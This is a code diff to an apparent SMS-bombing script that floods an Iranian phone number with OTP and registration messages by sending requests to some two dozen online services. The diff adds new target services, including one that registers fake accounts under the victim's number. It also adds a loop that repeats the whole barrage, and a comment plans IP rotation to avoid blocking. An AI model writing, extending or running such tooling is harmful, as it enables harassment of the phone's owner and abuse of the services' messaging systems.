@@ -1,5 +1,5 @@
 import requests
-import json
+# import json
 import re
 
 from colorama import Fore as C
@@ -9,7 +9,7 @@ range_n_limit = 100
 
 services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala', 'itoll',
              'tapsi', 'sibche', 'zarinpal', 'snappbox', 'snappfood', 'safaremoon', 'saapa', 'okala',
-               'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr']  # 23 online service
+               'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr', 'esam']  # 24 online service
 
 def validate_phone_number(phone_number):
     pattern = r"^09\d{9}$"  
@@ -19,7 +19,7 @@ def validate_phone_number(phone_number):
     else:
         return False
 
-def send(phone_number):  #TODO: add prvity Change IP
+def send(phone_number, r):  #TODO: add prvity Change IP
 
     cunt = 0
 
@@ -413,32 +413,59 @@ def send(phone_number):  #TODO: add prvity Change IP
         else:
             print("{}   {}   Fail".format(service, req.status_code))
 
+    def iranjahanpoosh(p):
+        service = 'iranjahanpoosh'
+        iranjahanpoosh_url = 'https://iranjahanpoosh.com/wp-admin/admin-ajax.php'
+        iranjahanpoosh_data = {
+            'digt_countrycode': '+98',
+            'phone': f'{p}',
+            'digits_reg_name': 'namename',
+            'digits_reg_password': 'asdasdasdasd',
+            'digits_process_register': '1',
+            'instance_id': '355dbb36c6e4eb225d81183a543dbbe1',
+            'optional_data': 'optional_data',
+            'action': 'digits_forms_ajax',
+            'type': 'register',
+            'dig_otp': '',
+            'digits': '1',
+            'digits_redirect_page': '-1',
+            'digits_form': '859b4679af',
+            '_wp_http_referer': '/?login=true&page=1&redirect_to=https%3A%2F%2Firanjahanpoosh.com%2F',
+        }
+
+        req = requests.post(iranjahanpoosh_url, data=iranjahanpoosh_data)
+        if req.status_code == 200:
+            print("{}   {}   Send".format(service, req.status_code))
+        else:
+            print("{}   {}   Fail".format(service, req.status_code))
 
     # RUN
     print("Service   Status")
-    try:
-        pakhsh(p=phone_number)
-        lendo(p=phone_number)
-        banimode(p=phone_number)
-        snappmarket(p=phone_number)
-        snapp(p=phone_number)
-        sheypoor(p=phone_number)
-        digikala(p=phone_number)
-        itoll(p=phone_number)
-        tapsi(p=phone_number)
-        sibche(p=phone_number)
-        zarinpal(p=phone_number)
-        snappbox(p=phone_number)
-        safaremoon(p=phone_number)
-        saapa(p=phone_number)
-        okala(p=phone_number)
-        timcheh(p=phone_number)
-        honari(p=phone_number)
-        mydigipay(p=phone_number)
-        ketabchi(p=phone_number)
-        komodaa(p=phone_number)
-        taaghche(p=phone_number)
-        azki(p=phone_number)
-        drdr(p=phone_number)
-    except:
-        pass
+    for rn in range(r):
+        try:
+            pakhsh(p=phone_number)
+            lendo(p=phone_number)
+            banimode(p=phone_number)
+            snappmarket(p=phone_number)
+            snapp(p=phone_number)
+            sheypoor(p=phone_number)
+            digikala(p=phone_number)
+            itoll(p=phone_number)
+            tapsi(p=phone_number)
+            sibche(p=phone_number)
+            zarinpal(p=phone_number)
+            snappbox(p=phone_number)
+            safaremoon(p=phone_number)
+            saapa(p=phone_number)
+            okala(p=phone_number)
+            timcheh(p=phone_number)
+            honari(p=phone_number)
+            mydigipay(p=phone_number)
+            ketabchi(p=phone_number)
+            komodaa(p=phone_number)
+            taaghche(p=phone_number)
+            azki(p=phone_number)
+            drdr(p=phone_number)
+            esam(p=phone_number)
+        except:
+            pass
